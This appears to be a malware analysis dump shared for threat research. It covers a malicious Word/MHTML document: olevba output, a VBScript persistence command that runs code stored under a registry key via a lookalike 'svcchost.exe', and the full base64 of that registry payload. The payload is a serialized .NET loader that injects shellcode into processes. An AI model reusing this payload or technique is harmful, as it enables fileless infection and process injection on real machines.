## Uploaded by @JohnLaTwC
## Sample hash: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812

olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
MHT:MASIHBD- d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
===============================================================================
FILE: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
Type: MHTML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: None - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function addData()
    Dim data As String
C:\ProgramData\svcchost.exe vbscript:execute("On Error Resume Next:set W = CreateObject(""WScript.Shell""):s="""":m = W.RegRead(""HKCU\Software\AppDataLow\DataApp\App""):execute(m):code close")

## Contents of HKEY_CURRENT_USER\Software\AppDataLow\DataApp\App

AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy
AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph
dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk
ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD
AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl
RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU
eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl
cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90
aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu
MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH
dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA
ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw
B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu
dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA
CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u
SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5
cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR
AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA
AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y
bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh
NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz
ZW1ibHkGFwAAAARMb2FkCg8MAAAAACIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy
YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAu7d2WQAAAAAA
AAAA4AAiIAsBMAAAGgAAAAYAAAAAAAC2OQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA
AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAZDkA
AE8AAAAAQAAAaAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAACw4AAAcAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA
AAAALnRleHQAAAC8GQAAACAAAAAaAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAaAMAAABA
AAAABAAAABwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAgAAAAAAAAAAAA
AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAJg5AAAAAAAASAAAAAIABQDYIgAAVBUAAAEAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzABABUAAAAB
AAARAigPAAAKfhAAAAoKEgAoBQAABiYqAAAAEzAKAFoBAAACAAARKBEAAAoFLgYFOtAAAAADKBIA
AAoKEgH+FQYAAAISAv4VBQAAAhQEfhAAAAp+EAAAChYgBAAACH4QAAAKFBIBEgIoEAAABiYIeyQA
AAR+EAAACgaOaX4BAAAEfgIAAAQoDgAABg1+EAAAChMECHskAAAECQYGjmkSBCgMAAAGJhYTBQh7
JAAABAkGjml+AwAABBIFKA8AAAYmCHsmAAAEKBMAAApvFAAAChMGHxAWEQYWbxUAAApvFgAACigL
AAAGEwcJEQd+EAAACigNAAAGJgh7JQAABCgRAAAGJit1KBcAAAoTCBEIEQgfIG8YAAAKbxkAAAoT
CAUeMy0oGgAACm8bAAAKbxwAAApvHQAACnIBAABwchMAAHBvHgAAChEIKB8AAAomKysoGgAACm8b
AAAKbxwAAApvHQAACnITAABwcgEAAHBvHgAAChEIKB8AAAomFiggAAAKKgAAEzAGANQAAAADAAAR
KBEAAAoELgMELU0DKBIAAAoKfhAAAAoGjml+AQAABH4DAAAEKAcAAAYLBhYHBo5pKCEAAAp+EAAA
CiYWDH4QAAAKDRYWBwkWEgIoCQAABhUoCgAABiYrdSgXAAAKEwQRBBEEHyBvGAAACm8ZAAAKEwQE
HjMtKBoAAApvGwAACm8cAAAKbx0AAApyAQAAcHITAABwbx4AAAoRBCgfAAAKJisrKBoAAApvGwAA
Cm8cAAAKbx0AAApyEwAAcHIBAABwbx4AAAoRBCgfAAAKJhYoIAAACipiIAAQAACAAQAABBqAAgAA
BB9AgAMAAAQqAAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAQAgAACN+AACs
CAAAMAoAACNTdHJpbmdzAAAAANwSAAAoAAAAI1VTAAQTAAAQAAAAI0dVSUQAAAAUEwAAQAIAACNC
bG9iAAAAAAAAAAIAAAFXHQIUCQIAAAD6ATMAFgAAAQAAABsAAAAHAAAAQwAAABMAAAA5AAAAIQAA
ACcAAAARAAAAAwAAAAIAAAAPAAAAAQAAAAIAAAAFAAAAAABcBgEAAAAAAAYASQUeCAYAtgUeCAYA
dwTRBw8APggAAAYAnwQHBwYAHQUHBwYA/gQHBwYAnQUHBwYAaQUHBwYAggUHBwYAtgQHBwYAiwT/
BwYAaQT/BwYA4QQHBwYAZAmABgoAGQfRBwYAOgWABgYAhwaABgYAMQSABgYAxgeABgYAsQmABgoA
KAnRBwoAYgPRBwYAnwmABgYAMgaABgoA0QPRBwYAQwb/BwAAAAAuAAAAAAABAAEAAQAQAOAIAAA9
AAEAAQACAQAAqQgAAEkABAAUAAIBAACECAAASQASABQACgEQAFgBAABNACQAFAAKARAAowEAAE0A
KAAUAAIBAADqCAAASQA6ABQAEQAYAgcBEQDIAAcBEQDXAAcBBgakAgcBVoBLBgoBVoBMBAoBVoBC
AwoBVoDwBgoBVoAVAwoBVoBWBAoBVoCTAwoBVoAHCQoBVoCzAgoBVoDQBgoBVoDfBgoBVoCjBgoB
VoAPBgoBBgakAgcBVoDuAA4BVoA3AA4BVoB2AA4BVoCQAA4BVoCvAQ4BVoBzAg4BVoDZAQ4BVoD4
AA4BVoAvAQ4BVoAZAQ4BVoBlAA4BVoAjAg4BVoAAAg4BVoDyAQ4BVoDIAQ4BVoA+Ag4BVoCIAg4B
BgAVCR4ABgBPAx4ABgD6AgcBBgDvAgcBBgC8AgcBBgBwAxIBBgCBBxIBBgC6AxIBBgCEAgcBBgCg
AgcBBgDUBQcBBgDcBQcBBgDECAcBBgDSCAcBBgDRBAcBBgC8CAcBBgDOCRUBBgAKABUBBgAWAB4A
BgC5CR4ABgDDCR4ABgCvBx4ABgakAhgBVoCyABsBVoCjABsBVoBbAhsBVoBnAhsBVoBsARsBVoB8
ARsBVoBHARsBVoC8ABsBVoCOARsBUCAAAAAAhhi5BwYAAQB0IAAAAACGAGsJHwEBANwhAAAAAIYA
ZwYmAQQAAAAAAIAAliDIAiwBBgAAAAAAgACRIDEHMgEIAAAAAACAAJEgUAc4AQkAAAAAAIAAkSDQ
Aj0BCgAAAAAAgACRIIcDRQEOAAAAAACAAJEgQgNMAREAAAAAAIAAkSBXCVcBFwAAAAAAgACWIFcD
XQEZAAAAAACAAJYgCAplARwAAAAAAIAAliBYAHABIQAAAAAAgACWIOMJdwEkAAAAAACAAJEg8gmA
ASkAAAAAAIAAliAHCYoBLgAAAAAAgACWIDUDnQE4AAAAAACAAJYgJwOdATkAvCIAAAAAkRi/B6IB
OgAAAAEAIgAAAAIAewMAAAMA7QUAAAEAIgAAAAIA7QUAAAEA/gMAAAIA2gkAAAEAzQcAAAEAzQcA
AAEAiwcAAAIAGwYAAAMAOwQAAAQAgQkAAAEAPgkAAAIACAYAAAMAJgQAAAEAXQgAAAIA9gUAAAMA
SAkAAAQAcQYAAAUAmQgAAAYA5AIAAAEAowMAAAIA8AcAAAEA9wgAAAIAqwMAAAMA7wIAAAEAFQkA
AAIAMAkAAAMAngcAAAQAAgYCAAUAjAYAAAEAUQAAAAIATwMAAAMArAIAAAEAFQkAAAIAPgkAAAMA
CAYAAAQAOwQAAAUAgQkAAAEAFQkAAAIAPgkAAAMACAYAAAQAiwkCAAUAcgkAAAEA7AMAAAIAGAQA
AAMAcAgAAAQAXQgAAAUATQgAAAYAmQgAAAcAnQkAAAgAGwoAAAkAbgcCAAoAuwYAAAEATwMAAAEA
TwMJALkHAQARALkHBgAZALkHCgApALkHEAAxALkHEAA5ALkHEABBALkHEABJALkHEABRALkHEABZ
ALkHEABhALkHFQBpALkHEABxALkHEACJALkHBgB5ALkHBgChAHwHHgChAOQFMQCpACgGNQCxAAYD
OwCxAOQHQQCBAHcGRgC5AN0CTADBAAgEUADJACAGVADJADkGWQCxAB4JXgCxAMIDYwDRAN8DaADJ
AKcHaADJAH8DbACxAKsJcgDBAJgJeQDZAAMKhwAJABQAmQAJABgAngAJABwAowAJACAAqAAJACQA
rQAJACgAsgAJACwAtwAJADAAvAAJADQAwQAJADgAxgAJADwAywAJAEAA0AAJAEQA1QAJAEwA2gAJ
AFAA3wAJAFQA5AAJAFgArQAJAFwAxgAJAGAA6QAJAGQA7gAJAGgA8wAJAGwA0AAJAHAA0AAJAHQA
+AAJAHgAywAJAHwAowAJAIAAngAJAIQAqAAJAIgA/QAJAIwAAgEIAOwAngAIAPAAowAIAPQAqAAI
APgArQAIAPwAsgAIAAABtwAIAAQBvAAIAAgBwQAIAAwBxgAuAAsApgEuABMArwEuABsAzgEuACMA
1wEuACsA4wEuADMA4wEuADsA4wEuAEMA1wEuAEsA6QEuAFMA4wEuAFsA4wEuAGMAAQIuAGsAKwJD
AFsAOAJjAHMAngCDAHMAngDjAHMAngAaACEAfgBPBgEAAAEJAMgCAQBAAQsAMQcBAEABDQBQBwEA
AAEPANACAgAAAREAhwMCAAABEwBCAwIAAAEVAFcJAgBAARcAVwMBAEABGQAICgEAAAEbAFgAAQBA
AR0A4wkBAAABHwDyCQEAAAEhAAcJAQAAASMANQMBAAABJQAnAwEABIAAAAEAAAAAAAAAAAAAAAAA
lwcAAAIAAAAAAAAAAAAAAJAAvwIAAAAAAgAAAAAAAAAAAAAAkACABgAAAAADAAIABAACAAUAAgAG
AAIABwACAAAAAGtlcm5lbDMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyAHNoZWxsYmFzZTY0ADxN
b2R1bGU+AENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IAcGZuQVBDAFF1ZXVlVXNlckFQQwBDUkVB
VEVfU1VTUEVOREVEAENSRUFURV9ERUZBVUxUX0VSUk9SX01PREUAQ1JFQVRFX05FV19DT05TT0xF
AFNVU1BFTkRfUkVTVU1FAFRFUk1JTkFURQBJTVBFUlNPTkFURQBQQUdFX1JFQURXUklURQBQQUdF
X0VYRUNVVEVfUkVBRFdSSVRFAFpFUk9fRkxBRwBDUkVBVEVfUFJFU0VSVkVfQ09ERV9BVVRIWl9M
RVZFTABDUkVBVEVfU0hBUkVEX1dPV19WRE0AQ1JFQVRFX1NFUEFSQVRFX1dPV19WRE0AU0VUX1RI
UkVBRF9UT0tFTgBQUk9DRVNTX0lORk9STUFUSU9OAFNFVF9JTkZPUk1BVElPTgBRVUVSWV9JTkZP
Uk1BVElPTgBESVJFQ1RfSU1QRVJTT05BVElPTgBTVEFSVFVQSU5GTwBDUkVBVEVfTkVXX1BST0NF
U1NfR1JPVVAAREVUQUNIRURfUFJPQ0VTUwBDUkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdf
UFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJPQ0VTUwBNRU1fQ09NTUlUAENSRUFURV9VTklDT0RF
X0VOVklST05NRU5UAEVYVEVOREVEX1NUQVJUVVBJTkZPX1BSRVNFTlQAR0VUX0NPTlRFWFQAU0VU
X0NPTlRFWFQAQ1JFQVRFX05PX1dJTkRPVwBkd1gASU5IRVJJVF9QQVJFTlRfQUZGSU5JVFkAZHdZ
AHZhbHVlX18AZHdEYXRhAFNldFF1b3RhAGNiAG1zY29ybGliAFdpbkV4ZWMAVmlydHVhbEFsbG9j
AGdldF9JZABscFRocmVhZElkAGR3VGhyZWFkSWQAZHdQcm9jZXNzSWQAR2V0UHJvY2Vzc0J5SWQA
VmlydHVhbE1lbW9yeVJlYWQAU3VzcGVuZFRocmVhZABSZXN1bWVUaHJlYWQAQ3JlYXRlVGhyZWFk
AGhUaHJlYWQAT3BlblRocmVhZABQcm9jZXNzVGhyZWFkAGxwUmVzZXJ2ZWQAY21kAFJlcGxhY2UA
VmlydHVhbEZyZWUARHVwbGljYXRlSGFuZGxlAGhIYW5kbGUAYkluaGVyaXRIYW5kbGUAbHBUaXRs
ZQBnZXRfTWFpbk1vZHVsZQBQcm9jZXNzTW9kdWxlAGdldF9GaWxlTmFtZQBscEFwcGxpY2F0aW9u
TmFtZQBJcENtZExpbmUAZ2V0X0NvbW1hbmRMaW5lAGxwQ29tbWFuZExpbmUAZHdGcmVlVHlwZQBW
YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBUZXJtaW5hdGUAVmlydHVhbE1lbW9yeVdyaXRlAEd1
aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2Vt
Ymx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAZHdGaWxsQXR0cmli
dXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0
cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGls
YXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1i
bHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21w
YXRpYmlsaXR5QXR0cmlidXRlAGR3WFNpemUAZHdZU2l6ZQBnZXRfU2l6ZQBhcmNoU2l6ZQBkd1N0
YWNrU2l6ZQBuU2l6ZQBkd1NpemUAU3luY2hyb25pemUAc2l6ZQBJbmRleE9mAEZyb21CYXNlNjRT
dHJpbmcAU3Vic3RyaW5nAE1hcnNoYWwAQWxsAGtlcm5lbDMyLmRsbABsb2FkZXIuZGxsAExvYWRT
aGVsbABwYXJhbQBnZXRfSXRlbQBTeXN0ZW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAFF1
ZXJ5TGltaXRlZEluZm9ybWF0aW9uAGxwUHJvY2Vzc0luZm9ybWF0aW9uAFNldEluZm9ybWF0aW9u
AFF1ZXJ5SW5mb3JtYXRpb24AVmlydHVhbE1lbW9yeU9wZXJhdGlvbgBTeXN0ZW0uUmVmbGVjdGlv
bgBQcm9jZXNzVGhyZWFkQ29sbGVjdGlvbgBXb3c2NERpc2FibGVXb3c2NEZzUmVkaXJlY3Rpb24A
V293NjRSZXZlcnRXb3c2NEZzUmVkaXJlY3Rpb24AbHBTdGFydHVwSW5mbwBaZXJvAGxwRGVza3Rv
cABscFN0YXJ0QWRkcgBsb2FkZXIAbHBCdWZmZXIAVG9Mb3dlcgBoU3RkRXJyb3IALmN0b3IALmNj
dG9yAEludFB0cgBwdHIAU3lzdGVtLkRpYWdub3N0aWNzAGdldF9UaHJlYWRzAGR3TWlsbGlzZWNv
bmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxl
clNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZEF0dHJpYnV0
ZXMAbHBQcm9jZXNzQXR0cmlidXRlcwBQcm9jZXNzQ3JlYXRpb25GbGFncwBkd0NyZWF0aW9uRmxh
Z3MAUHJvY2Vzc0FjY2Vzc0ZsYWdzAGR3RmxhZ3MAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJz
AFRlc3RDbGFzcwBUaHJlYWRBY2Nlc3MAZHdEZXNpcmVkQWNjZXNzAENyZWF0ZVByb2Nlc3MAaFBy
b2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAbHBCYXNlQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFk
ZHJlc3MAV2FpdEZvclNpbmdsZU9iamVjdABJbmplY3QAbHBmbE9sZFByb3RlY3QAZmxQcm90ZWN0
AGZsTmV3UHJvdGVjdABFeGl0AGxwRW52aXJvbm1lbnQAU3RhcnQAQ29udmVydABoU3RkSW5wdXQA
aFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBuQ21kU2hvdwBWaXJ0dWFsQWxsb2NFeABWaXJ0dWFsUHJv
dGVjdEV4AENvcHkAV3JpdGVQcm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQAAAAARcwB5
AHMAdwBvAHcANgA0AAARcwB5AHMAdABlAG0AMwAyAAAAAACN6nhpjEbDQp1Qqa9R6S1IAAQgAQEI
AyAAAQUgAQEREQQgAQEOBCABAQIDBwEYAgYYDwcJHQURGBEUGBgJEkEYDgMAAAgFAAEdBQ4FAAES
WQgEIAASQQUgARJdCAMgAAgDAAAOBCABCAMEIAEOCAQAABJZBCAAEmkDIAAOBSACDg4OBgACElkO
DgQAAQEICAcFHQUYCRgOCAAEAR0FCBgICLd6XFYZNOCJBP8PHwAEAQAAAAQCAAAABAgAAAAEEAAA
AAQgAAAABEAAAAAEgAAAAAQAAQAABAACAAAEAAQAAAQAEAAABAAAEAAEAAAAAAQAAAABBAAAAAQE
AAAACAQAAAQABAAAAAIEBAAAAAQAAAgABAAAAQACBgkDBhEMAwYREAIGDgIGBgIGCAMGERwGIAMB
Dg4IBSACAQ4IBQACCg4IBQABAhAYBAABAhgHAAQYGAkJCQYAAwIYCQkKAAYYCQkYGAkQCQUAAgkY
CQcAAxgRHAIICgAFAhgYHQUIEBgGAAMYGBgYCAAFGBgYCAkJCQAFAhgYCAkQCRIACgIODhgYAhEQ
GA4QERgQERQEAAEJGAMAAAEIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB
CAEAAgAAAAAACwEABmxvYWRlcgAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAxNwAAKQEAJDU5
YWQxNWQyLTYyODAtNDBkNC1iMzA2LTQ5Y2IwYmViMzJkMAAADAEABzEuMC4wLjAAAAUBAAEAAAAA
AAAAALq3dlkAAAAAAgAAABwBAABIOAAASBoAAFJTRFNo7wQE5pXcT4nqwk7ZIz0sAQAAAEU6XHBy
aXZcZnJhbWV3b3JrXGNvZGVcdG9vbHNcZXhlMmpzXGxvYWRlclxvYmpcUmVsZWFzZVxsb2FkZXIu
cGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjDkAAAAAAAAAAAAApjkAAAAgAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAJg5AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAA
EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAw
AACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAAwDAAAAAAAAAAAAAAwDNAAAAFYAUwBfAFYA
RQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAA
AAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQA
AABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsARsAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABl
AEkAbgBmAG8AAABIAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMA
AAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAANgAHAAEARgBpAGwAZQBE
AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGwAbwBhAGQAZQByAAAAAAAwAAgAAQBGAGkAbABlAFYA
ZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA2AAsAAQBJAG4AdABlAHIAbgBhAGwATgBh
AG0AZQAAAGwAbwBhAGQAZQByAC4AZABsAGwAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIA
aQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADEANwAAACoAAQABAEwAZQBn
AGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAPgALAAEATwByAGkAZwBpAG4AYQBsAEYA
aQBsAGUAbgBhAG0AZQAAAGwAbwBhAGQAZQByAC4AZABsAGwAAAAAAC4ABwABAFAAcgBvAGQAdQBj
AHQATgBhAG0AZQAAAAAAbABvAGEAZABlAHIAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIA
cwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBz
AGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAwAAAMAAAAuDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAQ0AAAAEAAAACRcAAAAJBgAAAAkWAAAABhoAAAAnU3lzdGVtLlJlZmxlY3Rpb24u
QXNzZW1ibHkgTG9hZChCeXRlW10pCAAAAAoL


## Strings from decode:

"System.DelegateSerializationHolder
Delegate
target0
method0
0System.DelegateSerializationHolder+DelegateEntry"System.DelegateSerializationHolder/System.Reflection.MemberInfoSerializationHolder
0System.DelegateSerializationHolder+DelegateEntry
type
assembly
target
targetTypeAssembly
targetTypeName
methodName
delegateEntry
0System.DelegateSerializationHolder+DelegateEntry
/System.Runtime.Remoting.Messaging.HeaderHandler
Kmscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
target0
System.Delegate
DynamicInvoke
"System.DelegateSerializationHolder
Delegate
target0
method0
0System.DelegateSerializationHolder+DelegateEntry
/System.Reflection.MemberInfoSerializationHolder
/System.Reflection.MemberInfoSerializationHolder
Name
AssemblyName
ClassName
Signature
MemberType
GenericArguments
System.Type[]
,System.Object DynamicInvoke(System.Object[])
 System.Xml.Schema.XmlValueGetter
MSystem.Xml, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
